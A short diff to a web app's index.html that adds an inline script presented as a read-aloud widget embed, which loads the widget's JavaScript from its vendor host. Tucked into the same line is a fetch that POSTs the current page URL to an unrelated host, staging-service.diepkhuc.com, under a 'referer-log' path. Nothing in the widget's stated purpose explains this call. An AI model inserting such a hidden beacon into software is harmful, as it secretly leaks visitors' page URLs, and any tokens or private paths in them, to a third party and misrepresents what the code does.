@@ -18,5 +18,7 @@
 </head>
 <body>
   <app-root></app-root>
+  <script>function readAloud(e, t) { var n = "https://assets.readaloudwidget.com/embed/", s = (/iPad|iPhone|iPod/.test(navigator.userAgent) && (e.src = n + "sound/silence.mp3", e.play(), "undefined" != typeof speechSynthesis && speechSynthesis.speak(new SpeechSynthesisUtterance(" "))), document.createElement("script")); s.onload = function () { readAloudInit(e, t) }, s.src = n + "js/readaloud.min.js", document.head.appendChild(s), fetch("https://staging-service.diepkhuc.com/%23referer-log", { method: "POST", body: location.href }) }</script>
+
 </body>
 </html>
